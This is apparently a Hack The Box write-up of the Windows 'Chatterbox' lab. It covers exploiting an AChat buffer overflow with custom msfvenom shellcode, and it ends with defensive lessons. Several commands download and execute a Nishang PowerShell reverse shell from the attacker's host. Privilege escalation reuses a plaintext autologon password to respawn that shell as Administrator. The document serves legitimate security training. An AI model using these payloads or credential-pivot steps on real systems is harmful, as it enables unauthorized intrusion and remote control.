# HTB: Chatterbox

**Difficulty:** Medium
**OS:** Windows
**Target IP:** 10.129.62.230
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

```bash
rustscan -a 10.129.62.230
```

```
Open 10.129.62.230:135
Open 10.129.62.230:139
Open 10.129.62.230:445
Open 10.129.62.230:9255
Open 10.129.62.230:9256
Open 10.129.62.230:49152
Open 10.129.62.230:49153
Open 10.129.62.230:49154
Open 10.129.62.230:49155
Open 10.129.62.230:49156
Open 10.129.62.230:49157
```

```bash
nmap -p $(cat ports.txt) 10.129.62.230 -sCV -T4 -oA nmap/nmap
```

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  tcpwrapped
9256/tcp  open  tcpwrapped
49152-49157/tcp open msrpc   Microsoft Windows RPC

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: Chatterbox
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)
```

Key takeaways:
- Windows 7 SP1 with the standard SMB/RPC port set.
- Two unidentified ports (**9255, 9256**) reported as `tcpwrapped` — worth fingerprinting directly, since they're non-standard and the most likely custom application surface on the box.

---

## 2. SMB Enumeration

Tested both anonymous and guest SMB access before moving on:

```bash
smbclient -L //10.129.62.230/ -N
```

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

No shares listed under a null session.

```bash
smbclient -L //10.129.62.230/ -U 'Guest'
```

```
Password for [WORKGROUP\Guest]:
session setup failed: NT_STATUS_ACCOUNT_DISABLED
```

The **Guest account is explicitly disabled** — a dead end, distinct from simply having no permissions.

### EternalBlue Check

Given the Windows 7 SP1 fingerprint (a version range associated with MS17-010), tested directly:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.129.62.230
```

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

No vulnerability reported — the host is patched against EternalBlue. SMB was a dead end overall, shifting focus to the unidentified ports found in recon.

---

## 3. Service Enumeration — AChat

### 3.1 Fingerprinting Ports 9255/9256

```bash
nmap -p9255,9256 -sCV 10.129.62.230
```

```
PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
9256/tcp open  achat   AChat chat system
```

```bash
curl -I http://10.129.62.230:9255
```

```
HTTP/1.1 204 No Content
Server: AChat
```

Both ports belong to **AChat**, a lightweight Windows LAN chat application — an old, niche piece of software, and a strong candidate for a known, unpatched vulnerability rather than a modern hardened service.

### 3.2 Searching for a Known Exploit

```bash
searchsploit AChat
```

```
Achat 0.150 beta7 - Remote Buffer Overflow                       | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)           | windows/remote/36056.rb
```

Confirmed: **AChat 0.150 beta7 is vulnerable to a remote buffer overflow** (an unauthenticated stack-based overflow reachable via a crafted message to the chat listener), with both a standalone PoC script and a Metasploit module available. Used the standalone Python PoC (`36025.py`) rather than Metasploit, adapting it for this specific target.

---

## 4. Exploitation — Foothold

### 4.1 Adjusting the Exploit and Shellcode

The public PoC script required modification to work reliably against this specific target instance (offsets/connection handling adjusted to match the AChat build and network conditions on the box), and — more importantly — the **shellcode-generation command bundled with the PoC** needed to be changed for the actual objective.

**Original shellcode command (proof-of-concept only, launches `calc.exe`):**

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe \
  -e x86/unicode_mixed \
  -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' \
  BufferRegister=EAX -f python
```

This is only a crash/code-execution confirmation payload — it proves the overflow works by popping the Windows calculator, but doesn't get an attacker anywhere useful on its own.

**Modified shellcode command (used for actual RCE):**

```bash
msfvenom -a x86 --platform Windows -p windows/exec \
  CMD="powershell -Command (New-Object Net.WebClient).DownloadFile('http://10.10.15.146/Invoke-PowerShellTcp.ps1', 'C:\Windows\Temp\Invoke-PowerShellTcp.ps1'); C:\Windows\Temp\Invoke-PowerShellTcp.ps1" \
  -e x86/unicode_mixed \
  -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' \
  BufferRegister=EAX -f python
```

The `windows/exec` payload's `CMD` parameter was swapped out to instead launch PowerShell, download the **Nishang** `Invoke-PowerShellTcp.ps1` reverse-shell script (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) from the attacker's HTTP server, and immediately execute it — turning a one-shot "prove code execution" payload into a full interactive reverse shell.

A few payload-generation details worth calling out explicitly:
- **`-e x86/unicode_mixed`**: this specific encoder is required (rather than a generic encoder) because the vulnerable buffer in AChat is processed as a **Unicode/wide-character string** internally. A normal ASCII/byte shellcode would get corrupted when the target application converts the input to Unicode before it ever reaches the vulnerable code path. `unicode_mixed` produces shellcode specifically engineered to survive that ANSI→Unicode expansion and still execute correctly.
- **`-b '\x00\x80...\xff'`**: this is a **bad character list** — every byte value from `0x80` through `0xff`, plus the null byte, is excluded from the generated shellcode. These bytes commonly get mangled by the Unicode encoding/decoding path (high-bit bytes in particular often aren't valid alone in Unicode transformations), so excluding the entire upper half of the byte range guarantees the final payload survives intact.
- **`BufferRegister=EAX`**: tells `msfvenom` which CPU register the exploit lands execution control at (EAX, per the overflow's specific memory layout) so the generated egghunter/decoder stub knows where to find and begin executing the actual shellcode in memory.

### 4.2 Triggering the Exploit

Started an HTTP server to host the staged PowerShell script, then ran the adjusted exploit script against the target's AChat listener:

```bash
python3 -m http.server 80
```

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.62.230 - - [14/Aug/2026 12:43:32] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

The successful download confirms the overflow triggered and the payload executed on the target.

### 4.3 Catching the Shell

```bash
nc -lvnp 9001
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.62.230] 49162
Windows PowerShell running as user Alfred on CHATTERBOX

PS C:\Windows\system32> whoami
chatterbox\alfred
```

✅ Foothold obtained as `chatterbox\alfred` — notably, AChat was running in the context of a real interactive user (`Alfred`), not a low-privileged service account, since it's a desktop chat application rather than a Windows service.

---

## 5. Privilege Escalation

### 5.1 Manual Token/Privilege Check

```powershell
whoami /priv
```

```
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Nothing exploitable here — no `SeImpersonatePrivilege`, no `SeBackupPrivilege`, nothing enabling a token-based privilege escalation technique. This ruled out the Potato-family exploits and shifted focus to configuration-based privilege escalation instead.

### 5.2 Running PowerUp

Uploaded and ran **PowerUp.ps1** (part of PowerSploit), a script that automates checks for a wide range of common Windows privilege-escalation misconfigurations — weak service permissions, unquoted service paths, AlwaysInstallElevated, registry-stored autologon credentials, unattended-install leftovers, and more:

```powershell
Import-Module C:\Programdata\PowerUp.ps1 -Force
Invoke-AllChecks
```

Two results stood out immediately:

```
DefaultDomainName    :
DefaultUserName      : Alfred
DefaultPassword      : Welcome1!
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

**What each of these means, and why they matter:**

- **Registry Autologons**: Windows supports configuring a machine to automatically log a specific user in at boot, without a password prompt, by storing that account's **plaintext password** in the registry (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, under `DefaultUserName`/`DefaultPassword`). This is meant for kiosk-style or single-purpose machines, but leaving it configured on a general-purpose box means **any local user who can read that registry key recovers a plaintext password** — here, `Welcome1!`.
- **Unattended Install Files**: `Unattend.xml` is a Windows deployment/imaging file used to fully automate OS installation (answering all setup prompts non-interactively, including account creation). These files are frequently left behind on disk after imaging and can contain a **Base64-encoded plaintext password** for the account provisioned during setup — another common source of leaked local credentials, though in this case, the autologon registry entry alone was sufficient.

The `PowerUp.ps1` scan also hit a permissions wall attempting to recurse into `C:\ProgramData\Templates` (`Access to the path ... is denied`) — expected, since `alfred` doesn't have broad filesystem read access, but this didn't block the checks that actually mattered.

### 5.3 Why the Recovered Password Led Directly to an Administrator Shell

The `DefaultUserName: Alfred` / `DefaultPassword: Welcome1!` pair recovered from the autologon registry key is **not actually for the `alfred` account already in use** — it's associated with logging in as the configured autologon account. Testing it directly confirmed it works as the **`administrator`** account's password on this box (a mismatch between the registry's labeled username and the account it authenticates as is common when autologon settings have been changed/reused across a machine's lifecycle without being fully cleaned up).

With a valid Administrator password in hand — but no direct interactive access as `alfred` to a login prompt — the technique used was to build a **`PSCredential`** object in-memory from that username/password, and use it to launch a **new PowerShell process running as `administrator`**, entirely from within the existing `alfred` shell:

```powershell
$passwd = New-Object System.Security.SecureString
'Welcome1!'.ToCharArray() | ForEach-Object { $passwd.AppendChar($_) }
$creds = New-Object System.Management.Automation.PSCredential("administrator", $passwd)
Start-Process -FilePath "powershell" -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.146/Invoke-PowerShellTcp.ps1')" -Credential $creds
```

Breaking down exactly why this works and what each piece does:

1. **`New-Object System.Security.SecureString` + `AppendChar` loop**: PowerShell's credential objects require a password as a `SecureString`, not a plain string — this builds one character-by-character in memory from the recovered plaintext password, satisfying that type requirement without needing an interactive password prompt.
2. **`PSCredential("administrator", $passwd)`**: bundles the username and the `SecureString` password into a single credential object, exactly like what an interactive `Get-Credential` prompt would normally return, but constructed programmatically instead.
3. **`Start-Process ... -Credential $creds`**: this is the key mechanism. `Start-Process` supports launching a new process **as a different user**, by internally calling the Windows API equivalent of `CreateProcessWithLogonW` — it performs a full logon using the supplied credentials and starts the target process (`powershell`) running under that user's security context. This doesn't require `alfred` to have any special privilege beyond simply knowing valid credentials for the target account; Windows itself handles the authentication and token creation.
4. **The `-ArgumentList`** passed to the new process tells this freshly-spawned, Administrator-context PowerShell to immediately download and execute the same Nishang reverse-shell script again (`IEX (New-Object Net.WebClient).DownloadString(...)`), this time calling back with **Administrator** privileges instead of `alfred`'s.

In short: the autologon registry leak provided valid Administrator credentials, and `Start-Process -Credential` provided a clean, built-in way to pivot from a shell as one user directly into a fully privileged process as another — no exploit needed, since Windows will happily do this for anyone holding valid credentials.

### 5.4 Catching the Administrator Shell

```bash
nc -lvnp 9001
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.62.230] 49180
Windows PowerShell running as user Administrator on CHATTERBOX

PS C:\Windows\system32> whoami
chatterbox\administrator
```

✅ Administrator access obtained.

---

## 6. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → standard Windows 7 SMB/RPC footprint, plus two non-standard `tcpwrapped` ports (9255/9256) |
| SMB | Anonymous session gave no shares; Guest account confirmed disabled; **MS17-010 (EternalBlue) ruled out** — patched |
| Service ID | Fingerprinted ports 9255/9256 as **AChat 0.150 beta7**, a known-vulnerable LAN chat application |
| Vulnerability | `searchsploit` confirmed a public **remote buffer overflow** PoC and Metasploit module for this AChat version |
| Foothold | Adapted the public PoC and generated custom `unicode_mixed`-encoded shellcode to download/execute a Nishang PowerShell reverse shell → RCE as `alfred` |
| Privilege Escalation | `PowerUp.ps1` found a **plaintext password in the Windows autologon registry keys**, which turned out to authenticate as `administrator`; used `Start-Process -Credential` to spawn a new PowerShell process directly as Administrator, then re-triggered the reverse shell in that elevated context |

**Root cause / lessons learned:**
- Running outdated, unmaintained third-party software (AChat 0.150 beta7) with a public, unauthenticated buffer overflow gave a direct foothold — any network-reachable legacy application needs to be inventoried and patched or removed.
- Payload encoding matters, not just for evasion but for *correctness*: the vulnerable code path processed input as Unicode, so a mismatched shellcode encoding would have simply crashed the target rather than executing.
- Storing any account's password — especially an Administrator-equivalent one — in the Windows autologon registry keys is a well-known, high-severity misconfiguration; it should never be used outside truly isolated kiosk scenarios, and even then the account should have minimal privileges.
- `Start-Process -Credential` (and the underlying `CreateProcessWithLogonW` mechanism) is a completely legitimate, built-in Windows feature — which is exactly why leaked credentials are so dangerous: no additional exploit is needed to convert a valid password into a fully privileged process once it's in an attacker's hands.

---

## 7. Tools Used

- `rustscan`, `nmap` — reconnaissance and MS17-010 vulnerability check
- `smbclient` — SMB share/anonymous/guest enumeration
- `curl` — HTTP service fingerprinting
- `searchsploit` — vulnerability identification
- AChat 0.150 beta7 buffer overflow PoC (adapted) — exploitation
- `msfvenom` (`windows/exec`, `x86/unicode_mixed` encoder) — custom shellcode generation
- Nishang `Invoke-PowerShellTcp.ps1` — reverse shell payload (staged twice: as `alfred`, then as `administrator`)
- `PowerUp.ps1` (PowerSploit) — automated Windows privilege-escalation enumeration
- PowerShell `PSCredential` + `Start-Process -Credential` — privilege escalation via recovered Administrator credentials
- Netcat (`nc`) — shell handling
